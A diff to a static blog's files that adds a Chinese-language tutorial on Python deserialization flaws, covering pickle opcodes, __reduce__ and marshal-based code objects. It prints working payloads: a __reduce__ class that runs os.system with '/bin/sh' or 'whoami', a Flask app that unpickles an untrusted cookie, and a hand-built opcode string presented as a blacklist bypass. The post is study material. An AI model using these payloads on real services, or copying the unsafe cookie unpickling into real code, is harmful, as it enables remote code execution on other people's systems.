@@ -301,6 +301,7 @@
 <li><a href="/Web_security/basic_learning/27.SQL%E6%B3%A8%E5%85%A5%E6%89%8B%E5%86%8C">SQL注入手册</a></li>
 <li><a href="/Web_security/basic_learning/28.Jinja2%E7%9A%84SSTI+Bypass">Jinja2 SSTI&amp;Bypass</a></li>
 <li><a href="/Web_security/basic_learning/29.Python%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8">Python沙箱逃逸</a></li>
+<li><a href="/Web_security/basic_learning/30.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E">Python反序列化漏洞</a></li>
 </ul>
 <h2 id="PHP相关">PHP相关</h2>
 <ul>
@@ -19173,6 +19174,84 @@ PHP脚本转换：
       <tags>
         <tag>Web安全学习</tag>
         <tag>沙箱逃逸</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python反序列化漏洞</title>
+    <url>/Web_security/basic_learning/30.Python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/</url>
+    <content><![CDATA[<h1 id="Python反序列化漏洞">Python反序列化漏洞</h1>
+<p>这是关于Python语言相关漏洞的第三篇：反序列化漏洞。学过PHP反序列化漏洞之后，肯定知道关于PHP反序列化各式各样的利用方式，比如POP链构造，Phar反序列化，原生类反序列化以及字符逃逸等等，Python相对而言没有PHP那么灵活，关于反序列化漏洞的话比较容易理解，主要涉及这么几个概念：pickle，pvm，<code>__reduce__</code>魔术方法。</p>
+<p>K0rz3n师傅的文章已经讲的极为透彻了，我就搬运总结学习一下。</p>
+<h2 id="0x01-python序列化和反序列化">0x01 python序列化和反序列化</h2>
+<h3 id="序列化">序列化</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;K0rz3n&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Hello ! My friends&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line"><span class="keyword">print</span> c</span><br></pre></td></tr></table></figure>
+<p>python3的输出：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103202644.png" alt=""></p>
+<p>python2的输出：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103202846.png" alt=""></p>
+<p>虽然看起来有点难理解，但是还是可以清楚地看到我们对象的属性 name ca01h，我们对象所属的类 people 都已近存储在里面了。</p>
+<h3 id="反序列化">反序列化</h3>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">People</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self,name = <span class="string">&quot;K0rz3n&quot;</span></span>):</span></span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">&quot;Hello ! My friends&quot;</span></span><br><span class="line"></span><br><span class="line">a=People()</span><br><span class="line">c=pickle.dumps(a)</span><br><span class="line">d = pickle.loads(c)</span><br><span class="line">d.say()</span><br></pre></td></tr></table></figure>
+<p>无论python2还是python3，输出的都是<code>Hello ! My friends</code>，也就是说我们成功通过反序列化的方式恢复了之前我们序列化进去的类对象并成功的执行了对象的方法。</p>
+<h2 id="0x02-反序列化漏洞">0x02 反序列化漏洞</h2>
+<h3 id="漏洞常见出现地方">漏洞常见出现地方</h3>
+<p><strong>1.通常在解析认证token，session的时候</strong></p>
+<p>现在很多web都使用redis、mongodb、memcached等来存储session等状态信息。</p>
+<p><strong>2.可能将对象Pickle后存储成磁盘文件。</strong></p>
+<p><strong>3.可能将对象Pickle后在网络中传输。</strong></p>
+<p>其实，最常见的也是最经典的也就是我们的第一点，也就是 flask 配合 redis 在服务端存储 session 的情景，这里的 session 是被 pickle 序列化进行存储的，如果你通过 cookie 进行请求 sessionid 的话，session 中的内容就会被反序列化，看似好像是没有什么问题,因为 session 是存储在 服务端的，但是终究是抵不住 redis 的未授权访问，如果出现未授权的话，我们就能通过 set 设置自己的 session ,然后通过设置 cookie 去请求 session 的过程中我们自定的内容就会被反序列化，然后我们就达到了执行任意命令或者任意代码的目的。</p>
+<h3 id="漏洞利用方式">漏洞利用方式</h3>
+<p>漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发<code>__reduce__()</code>函数从而触发恶意代码。</p>
+<p>简单说明一下<code>__reduce__()</code>函数：将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果。</p>
+<p>show code</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line"><span class="keyword">print</span> test</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103204054.png" alt=""></p>
+<p>稍微解释一下这几个指令：</p>
+<ul>
+<li>S : 后面跟的是字符串</li>
+<li>( ：作为命令执行到哪里的一个标记</li>
+<li>t ：将从 t 到标记的全部元素组合成一个元祖，然后放入栈中</li>
+<li>c ：定义模块名和类名（模块名和类名之间使用回车分隔）</li>
+<li>R ：从栈中取出可调用函数以及元祖形式的参数来执行，并把结果放回栈中</li>
+<li>. ：点号是结束符</li>
+</ul>
+<p>另外p0 p1 p2 p3只是标签，对命令我们的payload没有任何影响。</p>
+<p>我们让上面这个结果进行反序列化看一下结果</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span>(<span class="params">object</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">        a = <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">        <span class="keyword">return</span> (os.system,(a,))</span><br><span class="line">a = A()</span><br><span class="line">test = pickle.dumps(a)</span><br><span class="line">pickle.loads(test)</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103204400.png" alt=""></p>
+<p>再来看一个最简单的利用方式。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="meta">@app.route(&quot;/&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        user = base64.b64decode(request.cookies.get(<span class="string">&#x27;user&#x27;</span>))</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        username = user[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        username = <span class="string">&quot;Guest&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Hello %s&quot;</span> % username</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br></pre></td></tr></table></figure>
+<p>很明显，反序列化的参数是可控的。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">exp</span>(<span class="params">object</span>):</span></span><br><span class="line">     <span class="function"><span class="keyword">def</span> <span class="title">__reduce__</span>(<span class="params">self</span>):</span></span><br><span class="line">             <span class="keyword">return</span> (os.system,(<span class="string">&#x27;whoami&#x27;</span>,))</span><br><span class="line">      </span><br><span class="line">e = exp()</span><br><span class="line">s = pickle.dumps(e)</span><br></pre></td></tr></table></figure>
+<h2 id="0x03-Marshal反序列化">0x03 Marshal反序列化</h2>
+<p>现在看看还有啥别的序列化库。由于<code>pickle</code>不能序列化code对象，所以在python2.6后新增<code>marshal</code>来处理code对象的序列化。</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,builtins,pickletools,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">print(code_serialized)</span><br></pre></td></tr></table></figure>
+<p>运行结果：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103205604.png" alt=""></p>
+<p>好，现在我们需要让这段代码在反序列化的时候得到执行，那我们还能不能直接使用 <code>__reduce__</code> 呢？好像不行，因为 reduce 是利用调用某个 callable 并传递参数来执行的，而我们这个函数本身就是一个 callable ，我们需要执行它，而不是将他作为某个函数的参数，这个时候就需要自己构造opcode。</p>
+<p>这里也用到了 Python 的一个面向对象的特性，Python 能通过 types.FunctionTyle(func_code,globals(),’’)() 来动态地创建匿名函数：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> pickle,builtins,pickletools,base64</span><br><span class="line"><span class="keyword">import</span> marshal</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">fib</span>(<span class="params">n</span>):</span></span><br><span class="line">        <span class="keyword">if</span> n &lt;= <span class="number">2</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">return</span> fib(n<span class="number">-1</span>) + fib(n<span class="number">-2</span>)</span><br><span class="line">    <span class="keyword">print</span> (fib(<span class="number">5</span>))</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    pickle.dumps(foo.__code__)</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    print(e)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo.__code__))</span><br><span class="line">code_unserialized = marshal.loads(base64.b64decode(code_serialized))</span><br><span class="line">code_unserialized = types.FunctionType(code_unserialized, globals(), <span class="string">&#x27;&#x27;</span>)()</span><br><span class="line">print(code_unserialized)</span><br></pre></td></tr></table></figure>
+<p>那我们现在的任务就是如何通过 PVM 操作码来构造出这个东西的执行</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ctypes</span><br><span class="line">FunctionType</span><br><span class="line">(cmarshal</span><br><span class="line">loads</span><br><span class="line">(cbase64</span><br><span class="line">b64decode</span><br><span class="line">(S&#39;YwAAA...&#39;           #code对象序列化编码</span><br><span class="line">tRtRc__builtin__</span><br><span class="line">globals</span><br><span class="line">(tRS&#39;&#39;</span><br><span class="line">tR(tR.</span><br></pre></td></tr></table></figure>
+<p>利用方式</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span>():</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">return</span> os.system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">code_serialized = base64.b64encode(marshal.dumps(foo()))</span><br><span class="line">print(code_serialized)</span><br></pre></td></tr></table></figure>
+<p>执行结果：</p>
+<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20210103211313.png" alt=""></p>
+<p>在pickle下尝试执行：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">b&quot;&quot;&quot;ctypes</span></span><br><span class="line"><span class="string">FunctionType</span></span><br><span class="line"><span class="string">(cmarshal</span></span><br><span class="line"><span class="string">loads</span></span><br><span class="line"><span class="string">(cbase64</span></span><br><span class="line"><span class="string">b64decode</span></span><br><span class="line"><span class="string">(S&#x27;6QAAAAA=&#x27;   #whomai</span></span><br><span class="line"><span class="string">tRtRc__builtin__</span></span><br><span class="line"><span class="string">globals</span></span><br><span class="line"><span class="string">(tRS&#x27;&#x27;</span></span><br><span class="line"><span class="string">tR(tR.&quot;&quot;&quot;</span></span><br><span class="line">data = pickle.loads(payload)</span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure>
+<p>于是又有一个黑名单绕过执行函数的方式。</p>
+<h2 id="0x04-Others">0x04 Others</h2>
+<p>当然还有一些其他的反序列化方式，例如PyYaml，Jsonpickle，Shelve，这里就不多赘述了。</p>
+<p><a href="https://misakikata.github.io/2020/04/python-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">https://misakikata.github.io/2020/04/python-反序列化/</a></p>
+]]></content>
+      <categories>
+        <category>Web基础安全学习</category>
+      </categories>
+      <tags>
+        <tag>Web安全学习</tag>
+        <tag>反序列化</tag>
       </tags>
   </entry>
 </search>
